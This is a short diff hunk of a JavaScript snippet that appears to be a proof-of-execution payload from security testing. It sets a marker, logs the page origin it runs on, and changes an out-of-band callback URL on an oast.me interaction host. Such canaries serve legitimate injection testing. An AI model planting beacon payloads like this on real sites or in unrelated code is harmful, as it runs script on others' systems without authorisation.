@@ -11,7 +11,7 @@
  */
 (function () {
   var MARKER = "fw08-89p13";
-  var OAST   = "https://fw08-payload-89p13.da8l7djc8q36i3t2sqc048gyde3kjnmq9.oast.me/marker";
+  var OAST   = "https://da8l7djc8q36i3t2sqc048gyde3kjnmq9.oast.me/fw08-payload-89p13";
   try { window.__FW08_MARKER__ = MARKER; } catch (e) {}
   try { console.log("[" + MARKER + "] executing on " + location.origin); } catch (e) {}
 
